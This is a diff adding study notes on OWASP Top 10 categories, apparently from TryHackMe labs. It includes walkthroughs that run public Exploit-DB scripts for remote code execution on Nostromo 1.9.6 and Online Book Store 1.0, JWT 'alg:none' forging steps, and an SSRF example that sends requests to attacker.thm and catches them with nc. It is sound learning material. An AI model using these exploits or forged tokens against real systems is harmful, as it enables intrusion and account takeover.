@@ -521,3 +521,629 @@ Output = username of the current system user.
 - Harder to fix than coding bugs → often needs **redesign from scratch**.  
 - Prevention = **threat modelling + SSDLC** from the very beginning.  
 
+---
+# Security Misconfiguration (OWASP Top 10)
+
+## 🔑 Simple Meaning
+Security Misconfiguration happens when **settings are wrong** or **left insecure**.  
+It is not a coding bug, but a mistake in **configuration**.
+
+Even if you install the latest version of software, **wrong settings = unsafe system**.
+
+---
+
+## ⚡ Common Examples
+- ❌ **Cloud Storage Public**: S3 bucket open → anyone can read/write files.  
+- ❌ **Unnecessary Features**: Extra services, pages, accounts enabled.  
+- ❌ **Default Accounts/Passwords**: Admin:admin left unchanged.  
+- ❌ **Detailed Error Messages**: System reveals stack traces or paths.  
+- ❌ **Missing Security Headers**: Like `X-Frame-Options`, `Content-Security-Policy`.
+
+---
+
+## 📊 Comparison Table
+
+| Misconfiguration Issue        | Why It’s Dangerous |
+|-------------------------------|--------------------|
+| Public Cloud Buckets          | Exposes private files/data |
+| Default Passwords             | Attackers log in easily |
+| Extra Features Enabled        | Attackers exploit unused services |
+| Verbose Error Messages        | Leak system details to attacker |
+| Missing Security Headers      | Browser won’t protect user properly |
+
+---
+
+## 🐞 Debugging Interfaces
+A very common mistake = leaving **debug mode ON** in production.
+
+- Debug tools help developers test apps.  
+- If left enabled, attackers can **run code directly** on the server.  
+
+### 📌 Real Example: Patreon Hack (2015)
+- Framework: **Werkzeug** (Python-based web apps).  
+- Debug console available at `/console`.  
+- If an error happens, console shows up.  
+- Console lets you run Python code.  
+- ❌ Developers forgot to disable → attackers could run **any command** on server.
+
+---
+
+## ✅ Key Point
+Security misconfiguration = **door left open by mistake**.  
+Attackers don’t need to “break the lock”, they just walk in.
+---
+# Vulnerable and Outdated Components (OWASP Top 10)
+
+## 🔑 Simple Meaning
+This happens when a system is using **old or unpatched software**.  
+Old versions may already have **known vulnerabilities**, and attackers can easily find public exploits to use against them.
+
+---
+
+## ⚡ Example
+- Company runs **WordPress 4.6** (not updated for years).  
+- Tool like **WPScan** shows version number.  
+- Quick research = WordPress 4.6 vulnerable to **Remote Code Execution (RCE)**.  
+- Exploit is already available on **Exploit-DB**.  
+- Attacker can directly use that exploit → full system compromise.
+
+---
+
+## 📊 Why It’s Dangerous
+| Problem | Why It Matters |
+|---------|----------------|
+| Old software versions | Known vulnerabilities are already public |
+| Public exploits exist | Attackers don’t need to write new code |
+| Missing just one update | System can become exploitable |
+| Easy for attackers | Minimal effort → maximum damage |
+
+---
+
+## 🛠️ Tools Used to Detect
+- **WPScan** → checks WordPress versions and vulnerabilities  
+- **Nmap + NSE scripts** → detect outdated services (e.g., old Apache/SSH)  
+- **Exploit-DB** → search ready-made exploits  
+
+---
+
+## ✅ Key Point
+- Using outdated components = like **leaving your front door broken**.  
+- Attackers don’t need to break in — they just **use the known weakness**.  
+- Always keep software **updated and patched**.
+---
+# Vulnerable and Outdated Components – Example (Nostromo 1.9.6)
+
+## 🔑 Quick Recap
+- Old software = dangerous because **known exploits already exist**.  
+- Our main job = **find the software name + version → search for exploit**.  
+- Most of the hard work is already done by researchers, we just need to use it.
+
+---
+
+## ⚡ Example: Nostromo Web Server
+
+### Step 1: Find Software & Version
+We discover the server is running:
+Nostromo 1.9.6
+
+---
+
+### Step 2: Search Exploit on Exploit-DB
+- Go to **Exploit-DB**  
+- Search: `Nostromo 1.9.6`  
+- ✅ Top result = ready-made exploit script.
+
+---
+
+### Step 3: Run the Exploit Script
+Command:
+python 47837.py
+
+❌ Error appears:
+Traceback (most recent call last):
+File "47837.py", line 10, in <module>
+cve2019_16278.py
+NameError: name 'cve2019_16278' is not defined
+
+---
+
+### Step 4: Fix the Script
+Problem: One line in the script was wrong.  
+Solution: Comment it out.
+
+```python
+# cve2019_16278.py  # This line should be commented
+```
+### Step 5: Run Again (Correctly)
+Command:
+```
+python2 47837.py 127.0.0.1 80 id
+```
+Output:
+```
+HTTP/1.1 200 OK
+Server: nostromo 1.9.6
+uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)
+```
+🎉 Boom → We got Remote Code Execution (RCE).
+## 📊 Key Lessons
+- Step	What Happened	Lesson Learned
+- Find version	Nostromo 1.9.6 found	Version info is enough to start research
+- -Search Exploit	Found on Exploit-DB	Many exploits already exist
+- Run Script	Initial error	Exploits may need fixing
+- Fix Script	Commented bad line	Know basics of language (Python)
+- Success	Got RCE	Outdated software = full compromise
+## ✅ Important Notes
+- Exploit scripts may not work on first try.
+- Understanding the language (Python, Perl, etc.) helps in fixing.
+- Always read script usage instructions (arguments like IP, Port).
+- Sometimes easy (like Nostromo), sometimes harder (need HTML source, guessing).
+- If it’s a known vulnerability, there’s almost always a way to discover it.
+## 🔎 Final Thought
+- This OWASP Top 10 issue is dangerous because:
+- Attackers don’t need to write exploits.
+- Just research the version → use public exploit.
+- As a penetration tester, this is a very common and realistic scenario.
+---
+# 🛠️ Task 15 - Vulnerable and Outdated Components (Lab)
+
+## 🎯 Objective
+Exploit the vulnerable **Online Book Store 1.0** application running at:
+http://10.201.83.106:84
+and retrieve the content of the file:
+/opt/flag.txt
+
+---
+
+## 🔎 Step 1: Search for Exploit
+Use `searchsploit` to find known exploits for "Online Book Store 1.0".
+```
+searchsploit "Online Book Store 1.0"
+```
+Result:
+- SQL Injection
+- Arbitrary File Upload
+- **Unauthenticated Remote Code Execution** (47887.py)
+
+---
+
+## ⚡ Step 2: Copy Exploit
+Copy the exploit to the local directory.
+```
+searchsploit -m php/webapps/47887.py
+```
+Now exploit is available as `47887.py`.
+
+---
+
+## 🛠 Step 3: Check Exploit Usage
+Run the exploit without arguments to see usage.
+```
+python3 47887.py
+```
+Output:
+```
+usage: 47887.py [-h] url
+````
+👉 Means only **URL argument** is required.
+
+---
+
+## 🚀 Step 4: Run Exploit on Target
+Execute the exploit with the vulnerable application URL.
+```
+python3 47887.py http://10.201.83.106:84
+```
+This should give you **Remote Code Execution (RCE)** on the server.
+
+---
+
+## 📂 Step 5: Retrieve the Flag
+Once inside the server / RCE prompt, read the flag file:
+```
+cat /opt/flag.txt
+```
+Copy the flag and submit it on TryHackMe.
+
+---
+
+## ✅ Summary
+- Vulnerable app: **Online Book Store 1.0**
+- Vulnerability: **Unauthenticated RCE**
+- Exploit used: **Exploit-DB ID 47887**
+- Flag file location: **/opt/flag.txt**
+---
+# Broken Authentication & Session Management (OWASP Top 10)
+
+## 🔑 Simple Meaning
+- **Authentication** = Process of verifying user identity (usually username + password).  
+- **Session Management** = Keeping track of logged-in users using **session cookies**.  
+- HTTP(S) is **stateless**, so without cookies the server cannot remember users.  
+
+---
+
+## ⚡ How It Works
+1. User enters **username + password**.  
+2. Server verifies credentials.  
+3. If correct → server gives browser a **session cookie**.  
+4. Browser attaches cookie in every request → server knows who is sending data.  
+
+---
+
+## 🚨 Common Authentication Flaws
+- **Brute Force Attacks** → Attacker tries many username/password combos.  
+- **Weak Credentials** → If weak passwords allowed (`password1`, `123456`), attacker can easily guess.  
+- **Weak Session Cookies** → If cookies have predictable values, attacker can create fake cookies and hijack accounts.  
+
+---
+
+## 📊 Table Summary
+
+| Flaw Type              | What Happens | Why It’s Dangerous |
+|------------------------|--------------|--------------------|
+| Brute Force Attack     | Guessing passwords by many attempts | Can lead to account takeover |
+| Weak Passwords         | Users set easy/common passwords | Easy for attacker to guess |
+| Weak Session Cookies   | Predictable cookie values | Attackers hijack sessions |
+
+---
+
+## 🛡️ Mitigations
+- **Strong Password Policy** → Enforce complex passwords (length + symbols).  
+- **Account Lockout** → After multiple failed attempts, lock the account temporarily.  
+- **Multi-Factor Authentication (MFA)** → Example: Password + OTP on phone. Even if password is stolen, OTP adds another layer.  
+
+---
+
+## ✅ Key Point
+If authentication or session management is weak:  
+- Attackers can log into accounts without permission.  
+- They may access **sensitive personal data**.  
+- Strong policies + MFA + secure cookies = essential for protection.
+---
+# Authentication Logic Flaw – Re-Registration Vulnerability
+
+## 🔑 Simple Meaning
+Sometimes, the problem is not weak passwords or brute force, but a **developer mistake** in the authentication logic.  
+If input (like username/password) is not sanitized properly, attackers can **trick the system** into giving them unauthorized access.
+
+---
+
+## ⚡ Example: Re-Registering Existing User
+- There is already a user with username: `admin`.  
+- Attacker tries to **register again** with a modified version:  
+" admin" (notice the space at the beginning)
+- Application does not sanitize input properly.  
+- It registers this as a **new user** but gives the **same rights as original admin**.  
+- ✅ Result → Attacker can see and control everything the real admin sees.
+
+---
+
+## 📊 Why It’s Dangerous
+| Step | What Happens | Danger |
+|------|--------------|--------|
+| Input not sanitized | System accepts `" admin"` as different from `admin` | Developers think usernames are unique, but attacker bypasses |
+| New account created | Attacker registers duplicate account | Attacker now has admin-level privileges |
+| Privilege Escalation | Attacker acts as admin | Full access to sensitive data |
+
+---
+
+## 🛡️ Mitigation
+- **Sanitize Input** → Trim spaces, special characters before storing usernames.  
+- **Enforce Unique Usernames** → Strict checks to block duplicate-like entries (`admin`, ` admin`, `admin `).  
+- **Case-Insensitive Checks** → Treat `Admin`, `ADMIN`, `admin` as the same.  
+- **Validation Rules** → Only allow safe characters in usernames (a-z, 0-9, underscore).  
+
+---
+
+## ✅ Key Point
+- This is a **logic flaw**, not a typical brute force or weak password issue.  
+- Even small developer mistakes (like not trimming spaces) can lead to **account takeover**.  
+- Always sanitize and validate user input to prevent these vulnerabilities.
+---
+# Integrity & Software/Data Integrity Failures (OWASP Top 10)
+
+## 🔑 What is Integrity?
+Integrity = Making sure that **data has not been modified** (accidentally or maliciously).  
+In cybersecurity, protecting integrity means ensuring files, applications, and data remain **exactly as intended**.
+
+---
+
+## ⚡ Simple Example
+- You download a software installer.  
+- How do you know it was not modified during download?  
+- Solution → **Hash Verification**.  
+
+A **hash** = unique number generated by applying an algorithm (MD5, SHA1, SHA256, etc.) to a file.  
+If the file changes (even 1 bit), the hash will also change.
+
+---
+
+## 🛠️ Checking Integrity (Linux Example)
+
+File: `WinSCP-5.21.5-Setup.exe`
+```
+md5sum WinSCP-5.21.5-Setup.exe
+20c5329d7fde522338f037a7fe8a84eb WinSCP-5.21.5-Setup.exe
+sha1sum WinSCP-5.21.5-Setup.exe
+c55a60799cfa24c1aeffcd2ca609776722e84f1b WinSCP-5.21.5-Setup.exe
+
+sha256sum WinSCP-5.21.5-Setup.exe
+e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea WinSCP-5.21.5-Setup.exe
+
+```
+If calculated hashes = published hashes → ✅ File is safe and unmodified.  
+If hashes don’t match → ❌ File is tampered or corrupted.  
+
+---
+
+## 🚨 Software and Data Integrity Failures
+This vulnerability happens when **applications use code or data without integrity checks**.  
+If integrity is not verified, attackers can **modify the software or data** leading to malicious behavior.  
+
+---
+
+## 📊 Two Types of Integrity Failures
+
+| Type | Meaning | Example |
+|------|---------|---------|
+| **Software Integrity Failures** | Application updates or components are not verified | A malicious update injected into the software supply chain |
+| **Data Integrity Failures** | Application uses unverified data | Config files, databases, or cookies modified by attacker |
+
+---
+
+## 🛡️ Mitigations
+- Always publish and verify **hashes/signatures** (MD5, SHA256, GPG).  
+- Use **code signing certificates** to ensure updates are authentic.  
+- Verify **data integrity** (checksums, digital signatures).  
+- Use secure communication channels (HTTPS, TLS) to avoid tampering in transit.  
+
+---
+
+## ✅ Key Point
+- **Integrity = Trust**.  
+- If software/data integrity is not checked → attackers can sneak in modified versions.  
+- Hashing + signatures + secure update mechanisms = essential for protection.
+---
+# Software Integrity Failures  
+
+Software integrity failures occur when an application relies on third-party software/libraries hosted on external servers without verifying their integrity.  
+If the external source is compromised, malicious code may be injected and executed unknowingly.  
+
+---
+
+## Example  
+A common practice is to include libraries such as jQuery directly from their official CDN:  
+
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+
+When a user visits the website, the browser will fetch this file from the external server and execute it.  
+
+---
+
+## The Risk  
+- If an attacker compromises the official jQuery repository  
+- They can inject malicious code into the hosted file  
+- All websites loading it directly will unknowingly serve the attacker’s code to their visitors  
+- This is a **software integrity failure**, since no verification is done  
+
+---
+
+## The Solution – Subresource Integrity (SRI)  
+Modern browsers support **SRI (Subresource Integrity)**.  
+- It allows specifying a **hash** for the file  
+- The browser executes the file only if the hash matches  
+- If the file is modified, it will not be executed  
+
+Correct usage with integrity and crossorigin:  
+
+<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+
+Hash values can be generated at:  
+https://www.srihash.org/  
+---
+# Data Integrity Failures  
+
+Data integrity failures occur when an application **trusts data that can be tampered with by the user**.  
+
+---
+
+## Session Tokens and Cookies  
+
+- Web applications maintain sessions using **session tokens**.  
+- These tokens are often stored in the browser as **cookies**.  
+- Cookies are **key-value pairs** that get sent with every request to the server.  
+
+### Example  
+If a webmail app assigns a cookie after login that directly stores the username:  
+
+Set-Cookie: username=somya
+
+Then in every request, the browser sends:  
+
+Cookie: username=somya
+
+⚠️ Problem:  
+If the attacker modifies this cookie to:  
+
+Cookie: username=admin
+
+They could impersonate another user.  
+This is a **data integrity failure** because the server **trusted client-controlled data**.  
+
+---
+
+## The Solution – Integrity Mechanisms  
+
+To prevent tampering, cookies/tokens should be protected using integrity checks.  
+
+- One common approach is using **JSON Web Tokens (JWTs)**.  
+- JWT ensures the payload can’t be altered without detection.  
+
+---
+
+## JSON Web Tokens (JWT)  
+
+A JWT consists of 3 parts (all Base64 encoded):  
+
+1. **Header** – metadata (type = JWT, algorithm = HS256)  
+2. **Payload** – key-value pairs (user data, expiry, etc.)  
+3. **Signature** – cryptographic proof (using server’s secret key)  
+
+Example JWT:  
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
+eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.
+C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw
+
+- Header & Payload are just Base64 encoded JSON.  
+- Signature ensures data integrity using a secret key.  
+- If payload is changed, signature won’t match.  
+
+You can decode JWTs using:  
+👉 https://jwt.io  
+
+---
+
+## JWT None Algorithm Vulnerability  
+
+Some old JWT libraries had a **critical flaw**:  
+
+- If the attacker set `"alg": "none"` in the header  
+- And removed the signature part  
+
+The server would **skip signature validation**.  
+
+### Example Exploit Steps:  
+
+1. Take a valid JWT.  
+2. Decode the **header** and **payload**.  
+3. Modify payload (e.g., change `"username":"guest"` → `"username":"admin"`).  
+4. Set header `"alg":"none"`.  
+5. Remove the signature but keep the trailing dot (`.`).  
+
+Result:  
+<base64-header>.<base64-payload>.
+
+The server would then **accept the forged token without verifying integrity**.  
+
+---
+
+## Key Takeaway  
+
+- Never trust client-side data without validation.  
+- Always use secure token mechanisms like **JWT with proper signature verification**.  
+- Ensure libraries are updated to avoid vulnerabilities like the **JWT None Algorithm** issue.
+---
+# Logging and Monitoring  
+
+Logging is crucial in web applications to **track user actions** and detect malicious activity.  
+Without logging, it is impossible to trace what actions an attacker performed or determine the impact.  
+
+---
+
+## Importance of Logging  
+
+- **Regulatory Damage**: If attackers access sensitive user data and no logs exist, companies may face fines or legal actions.  
+- **Risk of Further Attacks**: Undetected attackers can continue exploiting the application, stealing credentials, or attacking infrastructure.  
+
+---
+
+## What to Log  
+
+Logs should include:  
+
+- HTTP status codes  
+- Time stamps  
+- Usernames  
+- API endpoints / page locations  
+- IP addresses  
+
+⚠️ Logs contain sensitive info → store securely and maintain multiple copies at different locations.  
+
+---
+
+## Monitoring Suspicious Activity  
+
+Detecting suspicious activity helps **stop attacks early** or **minimize damage** if detected later.  
+
+Common examples of suspicious activity:  
+
+- Multiple **unauthorized attempts** (e.g., failed login attempts, access to admin pages)  
+- Requests from **anomalous IP addresses or locations**  
+- Use of **automated tools** (detected via User-Agent headers or request speed)  
+- Use of **common attack payloads**  
+
+---
+
+## Responding to Suspicious Activity  
+
+- Detection alone is not enough → rate suspicious activity according to **impact level**.  
+- High-impact actions → raise alarms to alert relevant teams immediately.  
+- Example: Multiple failed admin login attempts = high-impact → immediate response required.  
+
+---
+
+## Practice  
+
+- Analyse sample log files to detect suspicious activity.  
+- Download sample logs via the task file or provided link.  
+
+---
+# Server-Side Request Forgery (SSRF)  
+
+SSRF occurs when an attacker can **coerce a web application** into sending requests on their behalf to arbitrary destinations.  
+The attacker can also **control the contents of the request**.  
+
+SSRF often arises when a web application interacts with **third-party services**.  
+
+---
+
+## Example Scenario  
+
+- Web app uses an **external API** to send SMS notifications.  
+- Each request includes a **secret API key** to authenticate the sender.  
+
+Vulnerability:  
+- The web app exposes a parameter (e.g., `server`) to the user.  
+- The attacker can change this parameter to point to their own server.  
+- The web app forwards the request, revealing the API key to the attacker.  
+
+### Attack Example  
+
+User request to vulnerable web app:  
+
+https://www.mysite.com/sms?server=attacker.thm&msg=ABC
+
+Web app sends request to attacker-controlled server:  
+
+https://attacker.thm/api/send?msg=ABC
+
+Capture request with Netcat:  
+
+nc -lvp 80
+Listening on 0.0.0.0 80
+Connection received on 10.10.1.236 43830
+GET /:8087/public-docs/123.pdf HTTP/1.1
+Host: 10.10.10.11
+User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
+Accept: /
+
+---
+
+## Potential Impact  
+
+Depending on the scenario, SSRF can be used to:  
+
+- Enumerate internal networks (IP addresses and ports).  
+- Abuse **trust relationships** between servers to access restricted services.  
+- Interact with **non-HTTP services** to potentially achieve **remote code execution (RCE)**.  
+
+---
+
+## Practical Example  
+
+- Navigate to: `http://10.201.112.84:8087/`  
+- Explore the simple web application.  
+- Identify the **admin area**, which is the main objective.  
+- Follow instructions to gain access to the restricted area using SSRF.
+---
